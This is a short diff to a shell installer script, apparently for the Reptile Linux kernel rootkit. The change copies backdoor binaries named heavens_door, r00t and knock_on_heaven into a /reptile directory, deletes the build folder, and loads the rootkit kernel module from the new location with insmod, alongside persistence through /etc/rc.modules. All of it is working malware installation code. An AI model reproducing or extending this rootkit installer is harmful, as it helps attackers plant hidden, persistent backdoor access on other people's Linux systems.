@@ -38,9 +38,11 @@ function reptile_cpy {
 	cp bin/reptile_mod.ko /reptile/reptile_mod.ko
 	cp bin/heavens_door /reptile
 	cp bin/r00t /reptile
+	cp bin/knock_on_heaven /reptile
 	cp scripts/kill_door.sh /reptile
 	cp scripts/start.sh /reptile
-	echo -e "\e[01;36mDONE!\e[00m"
+	rm -rf bin
+	echo -e "\e[01;36mAll binaries was copied to /reptile\e[00m"
 }
 
 
@@ -73,7 +75,7 @@ function reptile_install {
         	chmod +x /etc/rc.modules
     	fi
     	depmod
-    	insmod bin/$MODULE.ko
+    	insmod /reptile/$MODULE.ko
 }
 
 function reptile_uninstall {
